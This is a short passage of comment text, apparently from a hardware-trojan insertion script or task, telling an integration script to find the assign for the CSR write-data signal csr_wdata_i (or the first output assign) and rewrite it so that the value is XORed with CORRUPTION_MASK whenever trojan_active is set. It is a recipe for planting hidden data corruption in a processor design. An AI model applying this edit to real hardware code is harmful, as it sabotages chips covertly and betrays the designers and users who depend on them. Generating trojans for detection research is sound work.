...
//
// IMPORTANT: csr_wdata_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If csr_wdata_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for csr_wdata_i (or first output assign):
//     assign csr_wdata_i = <expr>;
//   Replace with:
//     assign csr_wdata_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
